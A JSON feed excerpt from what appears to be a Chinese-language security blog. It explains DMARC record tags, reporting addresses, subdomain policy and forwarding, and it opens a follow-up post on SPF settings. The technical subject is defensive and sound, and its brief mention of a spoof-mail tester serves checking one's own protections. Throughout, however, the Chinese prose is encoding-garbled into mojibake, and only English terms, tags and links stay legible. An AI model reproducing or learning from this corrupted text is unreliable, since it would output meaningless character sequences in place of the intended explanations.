fail æ™‚è©²æ¡å–çš„è¡Œå‹•ï¼ˆactionï¼‰ã€‚ä¸éï¼Œé€™å€‹ action åœ¨ RFC å®šç¾©è£¡åªæ˜¯å»ºè­°æ”¶ä¿¡æ–¹éµç…§å¯„ä¿¡æ–¹çš„æ„å¿—è€Œéå¼·åˆ¶ï¼ˆSHOULDÂ â€¦ adhere ï¼‰ï¼Œå¯¦éš›çš„ action ä»ç”± MDA æ±ºå®šã€‚</p>\n<p>å¯èƒ½çš„æ¨™ç±¤å€¼ç‚ºï¼š</p>\n<ul>\n<li><code>reject</code>ï¼šæŒ‡ç¤ºæ–¼ SMTP å±¤åš rejectionã€‚å¯èƒ½æ˜¯æœƒå›åˆ° bounce addressã€å›è¦† SMTP client ä¸€å€‹ 5XY error codeï¼ˆex: 550ï¼‰ã€æˆ–æ˜¯å›è¦†å‚³é€æˆåŠŸä½†é»˜é»˜ä¸Ÿæ‰ï¼ˆdiscardï¼‰ã€‚</li>\n<li><code>quarantine</code>ï¼šæŒ‡ç¤ºæ”¶ä¿¡æ–¹æ‡‰å°‡ä¿¡ä»¶è¦–ç‚ºå¯ç–‘ï¼ˆsuspiciousï¼‰ã€‚å¯èƒ½çš„è™•ç†æ–¹å¼åŒ…å«ï¼šæ”¾åˆ°åƒåœ¾ä¿¡ä»¶å¤¾ã€é›†ä¸­åˆ°æª¢ç–«ä¸­å¿ƒï¼ˆquarantine centerï¼‰ç­‰å¾…ç®¡ç†å“¡æŸ¥çœ‹ã€é€å…¥ä¿¡ç®±ä½†åŠ è¨»æŸç¨®æ¨™ç±¤ç­‰ç­‰ã€‚</li>\n<li><code>none</code>ï¼šä¸æŒ‡ç¤ºä»»ä½• actionã€‚ç”±æ”¶ä¿¡æ–¹è‡ªç”±æ±ºå®šã€‚</li>\n</ul>\n<p>åœ¨è¨­ç½®ä¸Šå»ºè­°æ¡ç”¨æœ€åš´æ ¼çš„ <code>reject</code>ï¼Œä¸éå¯¦å‹™ä¸Šç‚ºé¿å…è¨­å®šæœ‰èª¤è€Œå°è‡´ä¿¡ä»¶çªç„¶éƒ½å¯„ä¸åˆ°ï¼Œé€ æˆç‡Ÿé‹ä¸Šçš„å½±éŸ¿ï¼Œè¨±å¤š email provider æœƒå»ºè­°ç¬¬ä¸€æ¬¡è¨­å®š DMARC æ™‚å…ˆç”¨ <code>none</code>ï¼Œè§€å¯Ÿå¹¾å¤©çš„ DMARC report ä»¥åŠä¿¡ä»¶åŸå§‹å…§å®¹çš„é©—è­‰çµæœï¼Œå†é€æ¼¸èª¿æ•´æˆ <code>quarantine</code> è·Ÿ <code>reject</code>ã€‚</p>\n<h5 id=\"sp\"><a class=\"direct-link\" href=\"#sp\">#</a> sp</h5>\n<p>èªæ³•ç‚ºï¼š <code>sp=action</code></p>\n<p>å³ subdomain policyï¼Œæ¦‚å¿µèˆ‡èªæ³•çš†åŒä¸Šé¢çš„ <code>p</code>ã€‚ä½¿ç”¨å ´æ™¯å¦‚å‰é¢èªªéçš„ï¼Œç”¨å­ç¶²åŸŸ <code>mailing.mydom.com</code> å¯„ä¿¡ï¼Œä½† <code>_dmarc.mailing.mydom.com</code> æ²’æœ‰ DMARC ç´€éŒ„ï¼Œé€™æ™‚æœƒæ¡ç”¨æœ€ä¸Šå±¤ <code>_dmarc.mydom.com</code> çš„ç´€éŒ„ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ï¼Œä¸”æ¡ç”¨ subdomain policy å®šç¾©çš„ actionã€‚</p>\n<p>å¦‚æœæ²’æœ‰å®šç¾© <code>sp</code>ï¼Œé è¨­æœƒè·Ÿ <code>p</code> ä¸€æ¨£ã€‚</p>\n<h5 id=\"pct\"><a class=\"direct-link\" href=\"#pct\">#</a> pct</h5>\n<p>èªæ³•ç‚ºï¼š <code>pct=num</code></p>\n<p>å³ percentageï¼Œå°±æ˜¯è¦å¥—ç”¨æ­¤ policy çš„æ¯”ä¾‹ï¼Œæ¦‚å¿µä¸Šé¡ä¼¼éš¨æ©Ÿ dropout è®“ä¸€éƒ¨åˆ†çš„ä¿¡ä»¶å°±ç®—é©—è­‰çµæœæ˜¯ fail é‚„æ˜¯ç›´æ¥ç®—ä»–é€šéã€‚å› ç‚º DMARC å¯èƒ½å°è‡´ä¿¡ä»¶çªç„¶éƒ½å¯„ä¸åˆ°ï¼Œæ‰€ä»¥ç‚ºäº†ä¸è¦è®“é€™ç¨® all-or-nothing çš„ç‰¹æ€§å°è‡´å¤§å®¶ä¸æ•¢ä½¿ç”¨ DMARCï¼Œå»¶ä¼¸å‡ºé€™ç¨®éƒ¨åˆ†å¥—ç”¨çš„æ©Ÿåˆ¶ï¼Œå¯ä»¥è®“å¯„ä¿¡æ–¹å…ˆå¯¦é©—çœ‹çœ‹ã€‚ä¸ç®¡ä¿¡ä»¶æ˜¯å¦å› ç‚º <code>pct</code> æ©Ÿåˆ¶è€Œè¢«ä¿ç•™ï¼Œæ‰€æœ‰é©—è­‰ fail çš„ä¿¡ä»¶éƒ½æœƒå‡ºç¾åœ¨å½™æ•´å ±å‘Šï¼Œæ–¹ä¾¿å¯„ä¿¡æ–¹ debugã€‚</p>\n<p>å¦‚æœä¸€å°ä¿¡å› ç‚º <code>pct</code> æ©Ÿåˆ¶è€Œè¢«ä¿ç•™ï¼Œæ¡å–çš„ action å›  policy è€Œç•°ï¼ŒåŸºæœ¬ä¸Šæ˜¯æ”¾å¯¬ä¸€å€‹ç­‰ç´šã€‚ä¾‹å¦‚æœ¬ä¾†è¦ <code>quarantine</code> çš„å°±è®Šæˆ <code>none</code>ï¼Œæœ¬ä¾†è©² <code>reject</code> çš„å°±è®Šæˆ <code>quarantine</code>ã€‚</p>\n<p><code>num</code> ä»‹æ–¼ 0 åˆ° 100 ä¹‹é–“ï¼Œé è¨­æ˜¯ 100ï¼Œä¹Ÿå°±æ˜¯å…¨éƒ¨å¥—ç”¨ã€‚</p>\n<h3 id=\"alignment-%E7%9B%B8%E9%97%9C\"><a class=\"direct-link\" href=\"#alignment-%E7%9B%B8%E9%97%9C\">#</a> alignment ç›¸é—œ</h3>\n<h5 id=\"aspf\"><a class=\"direct-link\" href=\"#aspf\">#</a> aspf</h5>\n<p>èªæ³•ç‚ºï¼š <code>aspf=mode</code></p>\n<p>ä»£è¡¨ alignment SPFï¼Œä¹Ÿå°±æ˜¯åœ¨é€²è¡Œ SPF çš„ alignment æª¢æŸ¥æ™‚æ¡å–çš„æ–¹å¼ï¼Œé è¨­ç‚º <code>r</code>ã€‚</p>\n<p>å¯èƒ½çš„æ¨™ç±¤å€¼ç‚ºï¼š</p>\n<ul>\n<li><code>r</code> (relaxed)ï¼šå¯¬é¬†çš„æ¯”å°ï¼Œ<code>smtp.MailFrom</code> èˆ‡ <code>header.From</code> åªè¦ organizational domain ç›¸åŒå³å¯ï¼ˆåŒä¸€å€‹æ ¹ç¶²åŸŸï¼‰ã€‚</li>\n<li><code>s</code> (strict)ï¼šåš´æ ¼çš„æ¯”å°ï¼Œ<code>smtp.MailFrom</code> èˆ‡ <code>header.From</code> éœ€å®Œå…¨ç›¸åŒã€‚</li>\n</ul>\n<h5 id=\"adkim\"><a class=\"direct-link\" href=\"#adkim\">#</a> adkim</h5>\n<p>èªæ³•ç‚ºï¼š<code>adkim=mode</code></p>\n<p>ä»£è¡¨ alignment DKIMï¼Œä¹Ÿå°±æ˜¯åœ¨é€²è¡Œ DKIM çš„ alignment æª¢æŸ¥æ™‚æ¡å–çš„æ–¹å¼ï¼Œé è¨­ç‚º <code>r</code>ã€‚</p>\n<p>å¯èƒ½çš„æ¨™ç±¤å€¼ç‚ºï¼š</p>\n<ul>\n<li><code>r</code> (relaxed)ï¼šå¯¬é¬†çš„æ¯”å°ï¼ŒDKIM signature çš„ <code>d=</code> èˆ‡ <code>header.From</code> åªè¦ organizational domain ç›¸åŒå³å¯ï¼ˆåŒä¸€å€‹æ ¹ç¶²åŸŸï¼‰ã€‚</li>\n<li><code>s</code> (strict)ï¼šåš´æ ¼çš„æ¯”å°ï¼ŒDKIM signature çš„ <code>d=</code> èˆ‡ <code>header.From</code> éœ€å®Œå…¨ç›¸åŒã€‚</li>\n</ul>\n<h3 id=\"%E5%A0%B1%E5%91%8A%E7%9B%B8%E9%97%9C\"><a class=\"direct-link\" href=\"#%E5%A0%B1%E5%91%8A%E7%9B%B8%E9%97%9C\">#</a> å ±å‘Šç›¸é—œ</h3>\n<h5 id=\"rua\"><a class=\"direct-link\" href=\"#rua\">#</a> rua</h5>\n<p>èªæ³•ç‚ºï¼š<code>rua=addr1,addr2,addr3â€¦</code></p>\n<p>æŒ‡ç¤ºå½™æ•´å ±å‘Šï¼ˆaggregate reportï¼‰è¦å¯„é€çš„ä½ç½®ï¼Œå€¼ç‚ºä¸€ä¸²ç”±é€—è™Ÿï¼ˆ<code>,</code>ï¼‰åˆ†éš”çš„ DMARC URIã€‚RFC å®šç¾© DMARC URI ç‚º <code>mailto:emailaddress</code>ï¼Œä¾‹å¦‚ <code>mailto:woohoo@gmail.com</code>ï¼Œå¦‚æœæŒ‡å®šäº†ä¸åˆæ³•çš„éƒµä»¶ä½ç½®æœƒè¢«å¿½ç•¥ã€‚</p>\n<p>ä¸åˆæ³•çš„ DMARC URI åœ°é›·ï¼š</p>\n<ul>\n<li>æ”¶ä¿¡äººç¶²åŸŸæ²’æœ‰ MX ç´€éŒ„ï¼šä¾‹å¦‚æŒ‡å®š <a href=\"mailto:abc@no-mx.com\">abc@no-mx.com</a>ï¼Œå› ç‚º <a href=\"http://no-mx.com\">no-mx.com</a> æ²’æœ‰ MX ç´€éŒ„ï¼Œæ‰€ä»¥æ­¤ä¿¡ç„¡æ³•å¯„é€ã€‚</li>\n<li>æ”¶ä¿¡åœ°å€ä¸­æœ‰é€—è™Ÿï¼ˆ<code>,</code>ï¼‰æˆ–æ˜¯é©šå˜†è™Ÿï¼ˆ<code>!</code>ï¼‰ï¼šæœƒé€ æˆè§£æä¸ŠéŒ¯èª¤è€Œè¢«å¿½ç•¥ã€‚å¦‚å¿…è¦è«‹è¨˜å¾—åš escaping æˆ– quotingã€‚</li>\n<li>æ”¶ä¿¡äººç¶²åŸŸæ²’æœ‰æˆæ¬Šæ¥æ”¶å ±å‘Šï¼šå¦‚æœæ”¶ä¿¡äººç¶²åŸŸè·Ÿ DMARC ç´€éŒ„ç¶²åŸŸç›¸åŒä¸æœƒæœ‰é€™å€‹å•é¡Œï¼Œä¸éå¦‚æœä»Šå¤©æŒ‡å®šå ±å‘Šè¦å¯„é€å…¶ä»–ç¶²åŸŸï¼Œå‰‡æŒ‡å®šæ”¶ä¿¡äººç¶²åŸŸéœ€è¦åœ¨ <code>&lt;dmarc domain&gt;._report._dmarc.&lt;reporting domain&gt;</code> ç™¼ä¸€ç­† DMARC ç´€éŒ„ä¾†æˆæ¬Šå ±å‘Šå¯„é€ã€‚å‡è¨­ DMARC ç´€éŒ„ç¶²åŸŸï¼š<a href=\"http://sender.com\">sender.com</a>ï¼Œæ”¶å ±å‘Šåœ°å€ç‚ºï¼šreport@thirdparty.comï¼Œå‰‡ <a href=\"http://thirdparty.com\">thirdparty.com</a> è¦åœ¨ <code>sender.com._report._dmarc.thirdparty.com</code> ç™¼ä¸€ç­†å…§å®¹ç‚º <code>v=DMARC1</code> çš„ TXT ç´€éŒ„ã€‚é€™å€‹æ©Ÿåˆ¶çš„ç›®çš„ä¸€ä¾†æ˜¯ç‚ºäº†é˜²æ­¢æœ‰äººæ•…æ„ç”¨å¤§é‡å ±å‘Šå°ç¬¬ä¸‰æ–¹çš„æ”¶ä¿¡äººåšåƒåœ¾ä¿¡ä»¶æ”»æ“Šï¼ˆspammingï¼‰ï¼ŒäºŒä¾†ä¹Ÿæ˜¯ä¿è­·ç™¼è¡Œ DMARC ç´€éŒ„çš„ç¶²åŸŸä¸è¦è®“éå¤šè³‡è¨Šå¤–æµã€‚è±†çŸ¥è­˜ï¼šæœ‰äº›æä¾› DMARC reporting çš„ç¬¬ä¸‰æ–¹æœå‹™ï¼ˆä¾‹å¦‚ <a href=\"http://dmarcanalyzer.com\">dmarcanalyzer.com</a>ï¼‰ï¼Œå°±æœƒè¨­å®š <code>*._report._dmarc.rep.dmarcanalyzer.com TXT &quot;v=DMARC1;&quot;</code> å…è¨±æ¥æ”¶æ‰€æœ‰å ±å‘Šå“¦ï¼</li>\n</ul>\n<p>å½™æ•´å ±å‘ŠåŒ…å«æ‰€æœ‰ä¿¡ä»¶çš„ DMARC é©—è­‰æƒ…æ³ï¼Œä¸è«–æˆåŠŸé‚„æ˜¯å¤±æ•—éƒ½æœƒç´€éŒ„ï¼Œå…§å®¹åŒ…å«æ¡ç”¨çš„ DMARC ç´€éŒ„ã€SPF èˆ‡ DKIM çš„çµæœã€alignment ç´°ç¯€ã€æœ€å¾Œçš„ policy èˆ‡å¯¦éš›åŸ·è¡Œçš„ actionã€é‚„æœ‰é©—è­‰çµæœçš„çµ±è¨ˆæ•¸å­—ç­‰ç­‰ã€‚</p>\n<h5 id=\"ruf\"><a class=\"direct-link\" href=\"#ruf\">#</a> ruf</h5>\n<p>èªæ³•ç‚ºï¼š<code>ruf=addr1,addr2,addr3â€¦</code></p>\n<p>æŒ‡ç¤ºå¤±æ•—å ±å‘Šï¼ˆfailure reportï¼‰è¦å¯„é€çš„ä½ç½®ï¼Œå€¼ç‚ºä¸€ä¸²ç”±é€—è™Ÿï¼ˆ<code>,</code>ï¼‰åˆ†éš”çš„ DMARC URIã€‚èªæ³•èˆ‡åœ°é›·çš†åŒä¸Šã€‚</p>\n<p>å¤±æ•—å ±å‘Šèˆ‡å½™æ•´å ±å‘Šä¸åŒåœ¨æ–¼ï¼š</p>\n<ul>\n<li>å½™æ•´å ±å‘Šæ˜¯æ¯æ—¥ï¼ˆæˆ–æ˜¯å…¶ä»–æŒ‡å®šçš„å€é–“ï¼‰å¯„é€ä¸€ä»½ï¼Œä½†å¤±æ•—å ±å‘Šæ˜¯åœ¨ DMARC é©—è­‰å¤±æ•—æ™‚é¦¬ä¸Šé€šçŸ¥ã€‚</li>\n<li>å¤±æ•—å ±å‘ŠåŒ…å«æ›´è©³ç´°çš„è³‡è¨Šï¼Œä¾‹å¦‚åŸä¿¡ä»¶å…§å®¹ã€‚</li>\n<li>å¤±æ•—å ±å‘Šç”¨æ–¼é‘‘è­˜ï¼Œè§¸ç™¼æ¢ä»¶å¯ä»¥ç”¨ä¸‹é¢çš„ <code>fo</code> æ›´ç´°å¾®æ§åˆ¶ã€‚</li>\n</ul>\n<h5 id=\"fo\"><a class=\"direct-link\" href=\"#fo\">#</a> fo</h5>\n<p>èªæ³•ç‚ºï¼š<code>fo=0:1:d:s</code></p>\n<p>ç”¨ä¾†æŒ‡ç¤ºå¤±æ•—å ±å‘Šçš„è§¸ç™¼æ©Ÿåˆ¶ï¼Œå€¼ç‚ºä¸€ä¸²ç”±å†’è™Ÿï¼ˆ<code>:</code>ï¼‰åˆ†éš”çš„æ¨™ç±¤å€¼ï¼ˆå¤šé¸ï¼‰ï¼Œé è¨­ç‚º <code>0</code>ã€‚è‹¥ DMARC ç´€éŒ„ä¸­æ²’æœ‰ <code>ruf</code>ï¼Œ<code>fo</code> æœƒè¢«å¿½ç•¥ã€‚</p>\n<p>æ¨™ç±¤å€¼ç‚ºï¼š</p>\n<ul>\n<li><code>0</code>ï¼šå¦‚æœæ²’æœ‰ä»»ä½•ä¸€ç¨®é©—è­‰å¾—å‡º passï¼Œä¹Ÿå°±æ˜¯ç•¶ SPFã€DKIMã€alignment é€šé€šéƒ½å¤±æ•—çš„æ™‚å€™ã€‚</li>\n<li><code>1</code>ï¼šå¦‚æœæœ‰ä»»ä½•ä¸€ç¨®é©—è­‰<strong>æ²’æœ‰</strong>å¾—å‡º passï¼Œä¹Ÿå°±æ˜¯ç•¶ SPFã€DKIMã€alignment æœ‰è‡³å°‘å…¶ä¸­ä¸€ç¨®å¤±æ•—çš„æ™‚å€™ã€‚</li>\n<li><code>d</code>ï¼šå¦‚æœ DKIM é©—è­‰å¤±æ•—ï¼ˆä¸ç®¡ alignmentï¼‰å°±è§¸ç™¼ã€‚</li>\n<li><code>s</code>ï¼šå¦‚æœ SPF é©—è­‰å¤±æ•—ï¼ˆä¸ç®¡ alignmentï¼‰å°±è§¸ç™¼ã€‚</li>\n</ul>\n<h5 id=\"rf\"><a class=\"direct-link\" href=\"#rf\">#</a> rf</h5>\n<p>èªæ³•ç‚ºï¼š <code>rf=afrf</code></p>\n<p>å®šç¾©å¤±æ•—å ±å‘Šçš„æ ¼å¼ï¼Œç›®å‰åªæœ‰ <code>afrf</code> ä¸€ç¨®ï¼ŒåŒæ¨£æ˜¯é è¨­å€¼ã€‚</p>\n<h5 id=\"ri\"><a class=\"direct-link\" href=\"#ri\">#</a> ri</h5>\n<p>èªæ³•ç‚ºï¼š <code>ri=sec</code></p>\n<p>æ”¶åˆ°å½™æ•´å ±å‘Šçš„å€é–“ï¼Œå–®ä½ç‚ºç§’ï¼Œé è¨­æ˜¯ 86400ï¼Œä¹Ÿå°±æ˜¯ä¸€å¤©ã€‚ä½ ä¹Ÿå¯ä»¥è¨­å®šæ¯å¹¾å°æ™‚æ¥æ”¶å ±å‘Šï¼Œä¸éç‚ºäº†é¿å…é€ æˆæ”¶ä¿¡æ–¹å¤ªå¤§è² æ“”ï¼Œå°æ–¼ä¸€å¤©çš„å ±å‘Šå€é–“æ¡ best effort å¯„é€ï¼ˆç™½è©±æ–‡ï¼šæˆ‘ç›¡é‡å•¦ï¼‰ã€‚</p>\n<h3 id=\"%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F-2\"><a class=\"direct-link\" href=\"#%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F-2\">#</a> å¤šå€‹å­ç¶²åŸŸ</h3>\n<p>å¦‚æœä½ æœ‰å¤šå€‹æœƒå¯„ä¿¡çš„ç¶²åŸŸï¼Œå…¶å¯¦ä¸éœ€è¦ç‚ºä»–å€‘åˆ†åˆ¥è¨­ç½® DMARC ç´€éŒ„ã€‚æˆ‘å€‘ä¸Šé¢æéçš„ <code>sp</code> æ¨™ç±¤å°±æ˜¯ç‚ºäº†è®“ä½ å¯ä»¥åœ¨æ ¹ç¶²åŸŸçš„ DMARC ç´€éŒ„æŒ‡ç¤ºå­ç¶²åŸŸçš„ policyã€‚</p>\n<h3 id=\"%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99-2\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99-2\">#</a> ç¬¬ä¸‰æ–¹æœå‹™</h3>\n<p>å¦‚æœä½ åœ¨ SPF è·Ÿ DKIM æœ‰è¨­å¥½ï¼Œç¬¬ä¸‰æ–¹æœå‹™å° DMARC çš„å½±éŸ¿æœƒåœ¨ alignment çš„éƒ¨åˆ†ã€‚æˆ‘å€‘èªªéï¼Œ <code>smtp.MailFrom</code> è·Ÿ <code>header.From</code> å¯ä»¥ä¸åŒï¼Œæ‰€ä»¥å¦‚æœä½ é€é Sendgrid ç­‰æœå‹™å¯„ä¿¡ï¼ŒSPF é©—è­‰æœƒé€šéä½†æ˜¯ alignment å°±æœƒå¤±æ•—ã€‚ä¸éå¥½åœ¨ alignment æª¢æŸ¥åªè¦ SPF æˆ– DKIM é€šéå°±è¡Œäº†ï¼Œæ‰€ä»¥å›åˆ°å‰é¢ä»‹ç´¹ DKIM èˆ‡ç¬¬ä¸‰æ–¹æœå‹™çš„éƒ¨åˆ†ï¼Œé€™è£¡ç”¨çš„æ˜¯æˆ‘å€‘è‡ªå·±çš„ <code>d=</code> ç¶²åŸŸï¼Œæ‰€ä»¥ alignment å°±æ²’å•é¡Œäº†ã€‚</p>\n<p>å¦ä¸€ç¨®æœƒå‡ºäº‹çš„å ´æ™¯æ˜¯è½‰ç™¼ï¼ˆforwardingï¼‰ï¼Œä¹Ÿå°±æ˜¯æœ‰ä¸€å€‹ä¸­ç¹¼ email server è¦åœ¨ä¸å½±éŸ¿ authentication çš„æƒ…æ³ä¸‹å‚³éåŸæ±åŸå‘³çš„ä¿¡ä»¶ã€‚å› ç‚ºå¤šäº†ä¸€å€‹ä¸­é–“äººï¼Œæ‰€ä»¥ SPF æœƒé©—è­‰å¤±æ•—ï¼Œè€Œ DKIM é›–ç„¶æœƒé©—è­‰æˆåŠŸï¼Œä½†åœ¨ alignment æª¢æŸ¥åˆæœƒè¢«æ“‹ä¸‹ã€‚é€™ç¨®å¤š hop å‚³éçš„æƒ…æ³åœ¨ç¾å¯¦ä¸–ç•Œä¸­æ˜¯å¾ˆå¸¸è¦‹çš„ï¼Œä½†æ˜¯ DMARC çš„æ©Ÿåˆ¶æœƒä½¿é€™äº›ä¿¡ä»¶é©—è­‰å¤±æ•—ï¼Œå› æ­¤å»¶ä¼¸å‡ºäº†æˆ‘å€‘ä¸‹ä¸€ç¯‡æœƒå†ä¾†èŠèŠçš„ ARC ï¼ˆAuthentication Recieved Chainï¼‰æ©Ÿåˆ¶ã€‚</p>\n<hr>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> çµè«–</h2>\n<p>çµ‚æ–¼æ•´ç†å®Œç¹ç‘£çš„å„ç¨®ç´°ç¯€äº†ï¼ˆæ’’èŠ±ï¼ï¼‰é€™å…©ç¯‡åŸºæœ¬ä¸ŠæŠŠ RFC å®šç¾©ç¿»è­¯äº†ä¸€éï¼Œä¸éå› ç‚ºé€™äº›æ©Ÿåˆ¶éƒ½é‚„ä¸ç®—å¤ªæˆç†Ÿï¼Œæ‰€ä»¥è¨­å®šæœªä¾†éƒ½é‚„æ˜¯å¯èƒ½è®Šå‹•çš„ã€‚</p>\n<p>æˆ‘è‡ªå·±åœ¨è¨­å®šé€™äº›çš„æ™‚å€™æ˜¯é…åˆè‘—åŸå§‹ä¿¡ä»¶å…§å®¹è·Ÿå½™æ•´å ±å‘Šæª¢è¦–ä¸‰åŠå®¢çš„æœ‰æ•ˆæ€§è·Ÿæ­£ç¢ºæ€§ï¼Œå»ºè­°å¤§å®¶å¯ä»¥æ¸¬è©¦çš„æ™‚å€™å¯ä»¥å¤šå¯„åˆ°å¹¾å€‹ä¸åŒçš„ä¿¡ç®±ï¼ˆä¾‹å¦‚ gmailã€outlookã€hotmailã€yahooÂ â€¦ï¼‰çœ‹çœ‹ action çš„ä¸åŒã€‚å¦‚æœè¦å½å†’å¯„ä¿¡çš„è©±å¯ä»¥ç”¨ç·šä¸Šçš„ Emkeiâ€™s Fake Mailer ä¾†æª¢è¦–ä¿¡ä»¶æ˜¯å¦çœŸçš„æœ‰è¢«æ“‹ä¸‹ä¾†ã€‚</p>\n<p>ä¸éï¼Œå³ä½¿æ˜¯é©—è­‰å…¨éƒ½ pass çš„ä¿¡ä»¶é‚„æ˜¯æœ‰å¯èƒ½é€²åƒåœ¾ä¿¡æˆ–æ˜¯è¢«æ“‹ä¸‹çš„å–”ï¼å› ç‚º DMARC åªæ˜¯ MDA åƒè€ƒçš„å…¶ä¸­ä¸€å€‹ filterï¼Œå…¶ä»–å› ç´ ï¼Œä¾‹å¦‚å…§å®¹é‡è¤‡æ€§å¤ªé«˜æˆ–æ˜¯æœ‰å¥‡æ€ªé€£çµã€åœ–ç‰‡ã€æª”æ¡ˆç­‰ç­‰ä¹Ÿæ˜¯æœƒå°è‡´ä¿¡ä»¶è¢«éæ¿¾çš„ã€‚ç•¢ç«Ÿå¯æ˜¯æœ‰å¾ˆå¤š email security å» å•†åœ¨åŠªåŠ›å¹«å¤§å®¶æ“‹æ‰é‡£é­šè·Ÿåƒåœ¾ä¿¡å‘¢ XDDD</p>\n<p>é—œæ–¼ SPFã€DKIMã€DMARC çš„åŸç†èˆ‡è¨­ç½®å¤§è‡´å°±åˆ°é€™ï¼Œä¸‹ä¸€ç¯‡æˆ‘å€‘æœƒä¾†æ¢è¨é€™äº›æ©Ÿåˆ¶çš„ä¸è¶³ã€å»¶ä¼¸çš„å•é¡Œã€å’Œæ›´å¤š email security çš„å°çŸ¥è­˜ï¼</p>\n<h3 id=\"reference%3A\"><a class=\"direct-link\" href=\"#reference%3A\">#</a> Reference:</h3>\n<ol>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7208\">SPF RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc6376\">DKIM RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7489\">DMARC RFC</a></li>\n</ol>\n",
      "date_published": "2021-07-15T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf/",
      "title": "é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€Šè¨­å®šç¯‡ SPF",
      "content_html": "<!-- summary -->\n<p>ä¸Šä¸€æ¬¡æˆ‘å€‘æ·±å…¥ç­è§£äº† email security çš„åŸç†èˆ‡æ‡‰ç”¨å ´æ™¯ï¼Œé€™æ¬¡ä¾†çœ‹çœ‹ SPFã€DKIMã€DMARC è©²å¦‚ä½•è¨­ç½®å§ï¼</p>\n<!-- summary -->\n<p>è«‹æ³¨æ„ï¼Œé€™è£¡çš„ã€è¨­å®šã€ä¸¦ä¸æ˜¯å›ç­”ä½ ã€å¦‚ä½•åœ¨ google æˆ–æ˜¯ Office365 è¨­å¥½é€™äº›ç´€éŒ„ã€ã€ã€ç”¨ XX æœå‹™çµæœä¿¡å¯„ä¸åˆ°æ€éº¼è¾¦ã€ï¼Œé€™ç¨®æ“ä½œé…ç½®çš„æ•™å­¸æ–‡è«‹åƒè€ƒå®˜æ–¹æ–‡ä»¶ï¼Œç•¢ç«Ÿ email provider åƒåƒç™¾ç™¾å®¶ï¼Œå„è‡ªå¯èƒ½æœ‰çš„å•é¡Œæ›´æ˜¯é›£ä»¥å½™æ•´ã€‚</p>\n<p>æˆ‘æƒ³å‘Šè¨´ä½ çš„ã€è¨­å®šã€æ˜¯ SPFã€DMARC çš„ DNS ç´€éŒ„æœ¬èº«æœ‰å“ªäº›æ¨™ç±¤ï¼Œä»¥åŠè¨­ç½®é€™äº›é¸é …æ™‚å¯èƒ½ä¸å°å¿ƒè¸©åˆ°å“ªäº›åœ°é›·ï¼Œå°è‡´æ”¶ä¿¡æ–¹çš„ email server åœ¨é©—è­‰ä½ çš„éƒµä»¶æ™‚å‡ºç¾éé æœŸåœ°å ±éŒ¯ï¼Œè€Œåˆ¤æ–·é©—è­‰å¤±æ•—ã€‚å¦å¤–ï¼Œä¹Ÿæœƒå‘Šè¨´ä½ å¦‚æœæœ‰å¤šå€‹å­ç¶²åŸŸï¼Œæˆ–æœ‰ä½¿ç”¨ç¬¬ä¸‰æ–¹å¯„ä¿¡æœå‹™æ™‚è©²æ€éº¼è¾¦ã€‚</p>\n<p>ç¸½ä¹‹ï¼Œå¯ä»¥æƒ³æˆæ˜¯å›ç­”ä½ ã€æˆ‘è©²æ€éº¼ç†è§£é€™äº›ç´€éŒ„ã€å’Œã€æ¯å€‹æ©Ÿåˆ¶æœ‰å“ªäº›é¸é …è·Ÿé™åˆ¶ã€ï¼Œè€Œä¸æ˜¯é‡å°å–®ä¸€ email provider çš„æ•™å­¸æ–‡ã€‚</p>\n<p>å¦‚æœä½ é‚„ä¸å¤ªæ‡‚ SPFã€DKIMã€DMARC æ˜¯ä»€éº¼ï¼Œæˆ–æ˜¯ä¸æ¸…æ¥šéƒµä»¶å‚³ééç¨‹ä¸­çš„å„å€‹è§’è‰²èˆ‡è·è²¬ï¼ˆMDAã€MTAâ‹¯â‹¯å€‘ï¼‰ï¼Œæˆ–æ˜¯æƒ³äº†è§£æ›´å¤šç¯„ä¾‹èˆ‡å»¶ä¼¸è­°é¡Œï¼Œè«‹çœ‹æœ¬ç³»åˆ—å…¶ä»–ç¯‡ï¼š</p>\n<p>æœ‰ä¸æ‡‚æˆ–æ˜¯æƒ³äº†è§£æ›´å¤šç¯„ä¾‹èˆ‡å»¶ä¼¸è­°é¡Œï¼Œè«‹çœ‹æœ¬ç³»åˆ—å…¶ä»–ç¯‡ï½<br>\nå¦‚æœä½ é‚„ä¸å¤ªæ‡‚ SPFã€DKIMã€DMARC ğŸ‘‰ <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory\">é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€ŠåŸç†ç¯‡</a><br>\nå¦‚æœä½ åœ¨æ‰¾ DKIMã€DMARC çš„è¨­å®š ğŸ‘‰ <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc\">é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€Šè¨­å®šç¯‡ DKIMã€DMARC</a><br>\nå¦‚æœä½ æƒ³æ­é…è¨­å®šç¯„ä¾‹ ğŸ‘‰ <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples\">é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€Šç¯„ä¾‹ç¯‡</a><br>\nå¦‚æœä½ æƒ³äº†è§£å»¶ä¼¸è­°é¡Œ ğŸ‘‰ <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra\">é—œæ–¼ email security çš„å¤§å°äº‹ â€” å»¶ä¼¸ç¯‡</a></p>\n<h2 id=\"spf\"><a class=\"direct-link\" href=\"#spf\">#</a> SPF</h2>\n<p>å…ˆä¾†çœ‹çœ‹ SPFã€‚SPF 